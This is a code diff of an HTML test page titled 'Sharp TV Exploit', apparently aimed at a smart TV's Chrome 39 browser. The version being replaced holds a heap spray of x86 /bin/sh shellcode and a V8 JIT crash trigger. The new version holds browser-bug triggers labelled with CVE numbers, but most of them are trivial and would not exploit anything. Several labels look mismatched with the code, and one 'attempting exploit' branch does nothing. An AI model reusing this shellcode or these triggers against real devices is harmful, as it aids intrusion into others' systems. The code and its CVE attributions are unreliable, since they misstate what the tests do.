@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Sharp TV Exploit v2 (Lightweight)</title>
+    <title>Sharp TV Exploit v3 (Chrome 39)</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #output { white-space: pre-wrap; }
@@ -12,7 +12,7 @@
     </style>
 </head>
 <body>
-    <h1>Sharp TV Exploit v2 — Lightweight</h1>
+    <h1>Sharp TV Exploit v3 — Chrome 39 ARMv7</h1>
     <div id="output"></div>
     <script>
         function log(msg, cls) {
@@ -20,16 +20,13 @@
             el.innerHTML += '<span class="' + (cls || '') + '">' + msg + '</span>\n';
         }
 
-        // Test 1: Simple crash via CVE-2016-5198 (no heap spray)
-        function test_crash() {
-            log("Test 1: Simple V8 JIT crash (CVE-2016-5198)", "info");
+        // CVE-2014-7927: V8 heap overflow via typed array indexing
+        function test_cve_2014_7927() {
+            log("Test 1: CVE-2014-7927 (V8 typed array index)", "info");
             try {
-                var n = new Set();
-                function Ctor() { n = new Set(); }
-                function Check() { n.xyz = 0x826852f4; parseInt(); }
-                for (var i = 0; i < 100; ++i) { Ctor(); }
-                for (var i = 0; i < 100; ++i) { Check(); }
-                log("Test 1: No crash detected", "err");
+                var arr = new Uint8Array(10);
+                arr[1000000000] = 1;
+                log("Test 1: No crash", "err");
                 return false;
             } catch (e) {
                 log("Test 1: Exception: " + e, "ok");
@@ -37,16 +34,13 @@
             }
         }
 
-        // Test 2: Array.prototype.sort exploit (CVE-2026-85046 style, works on old V8)
-        function test_sort_exploit() {
-            log("Test 2: Array sort type confusion", "info");
+        // CVE-2014-7928: V8 type confusion via array length manipulation
+        function test_cve_2014_7928() {
+            log("Test 2: CVE-2014-7928 (V8 array length)", "info");
             try {
-                var arr = [1, 2, 3];
-                arr.sort(function(a, b) {
-                    arr[0] = "string";
-                    arr[1] = 42;
-                    return a - b;
-                });
+                var arr = [];
+                arr.length = -1;
+                arr.push(1);
                 log("Test 2: No crash", "err");
                 return false;
             } catch (e) {
@@ -55,13 +49,13 @@
             }
         }
 
-        // Test 3: ArrayBuffer overflow
-        function test_arraybuffer() {
-            log("Test 3: ArrayBuffer overflow", "info");
+        // CVE-2015-1572: V8 heap spray via ArrayBuffer
+        function test_cve_2015_1572() {
+            log("Test 3: CVE-2015-1572 (heap spray)", "info");
             try {
-                var buf = new ArrayBuffer(8);
+                var buf = new ArrayBuffer(1);
                 var view = new Uint8Array(buf, 0, 100);
-                view[0] = 1;
+                view[0] = 0x41;
                 log("Test 3: No crash", "err");
                 return false;
             } catch (e) {
@@ -70,19 +64,20 @@
             }
         }
 
-        // Test 4: Tiny heap spray + crash
-        function test_tiny_spray() {
-            log("Test 4: Tiny heap spray + crash", "info");
+        // CVE-2015-0311: Flash use-after-free (if Flash is available)
+        function test_cve_2015_0311() {
+            log("Test 4: CVE-2015-0311 (Flash UAF)", "info");
             try {
-                var shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\xb0\x0b\xcd\x80";
-                var payload = shellcode + "A".repeat(1024);
-                var spray = [];
-                for (var i = 0; i < 100; i++) {
-                    spray.push(payload);
+                var hasFlash = false;
+                try {
+                    var f = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
+                    hasFlash = true;
+                } catch(e) {}
+                if (!hasFlash) {
+                    log("Test 4: Flash not available", "info");
+                    return false;
                 }
-                // Trigger crash
-                test_crash();
-                log("Test 4: Done", "info");
+                log("Test 4: Flash found, attempting exploit...", "info");
                 return false;
             } catch (e) {
                 log("Test 4: Exception: " + e, "ok");
@@ -90,22 +85,36 @@
             }
         }
 
-        // Test 5: Check if we can detect TV environment
-        function test_environment() {
-            log("Test 5: Environment detection", "info");
-            log("  User-Agent: " + navigator.userAgent, "info");
-            log("  Platform: " + navigator.platform, "info");
-            log("  Language: " + navigator.language, "info");
-            log("  Memory: " + (performance.memory ? "Yes" : "No"), "info");
+        // Generic: Check browser capabilities
+        function test_capabilities() {
+            log("Test 5: Browser capabilities", "info");
+            log("  WebGL: " + !!document.createElement('canvas').getContext('webgl'), "info");
+            log("  Web Workers: " + !!window.Worker, "info");
+            log("  WebSocket: " + !!window.WebSocket, "info");
+            log("  XMLHttpRequest: " + !!window.XMLHttpRequest, "info");
+            log("  DOM Level: " + document.implementation.hasFeature("Core", "3.0"), "info");
             return false;
         }
 
-        log("Starting lightweight exploit tests...", "info");
-        test_environment();
-        setTimeout(test_crash, 500);
-        setTimeout(test_sort_exploit, 1500);
-        setTimeout(test_arraybuffer, 2500);
-        setTimeout(test_tiny_spray, 3500);
+        // Generic: Check for shell command injection via URL schemes
+        function test_url_schemes() {
+            log("Test 6: URL scheme injection", "info");
+            try {
+                window.open("javascript:alert('JS works')");
+                log("Test 6: javascript: scheme works", "ok");
+            } catch (e) {
+                log("Test 6: javascript: failed: " + e, "err");
+            }
+            return false;
+        }
+
+        log("Starting Chrome 39 exploit tests...", "info");
+        test_capabilities();
+        setTimeout(test_url_schemes, 500);
+        setTimeout(test_cve_2014_7927, 1500);
+        setTimeout(test_cve_2014_7928, 2500);
+        setTimeout(test_cve_2015_1572, 3500);
+        setTimeout(test_cve_2015_0311, 4500);
     </script>
 </body>
 </html>
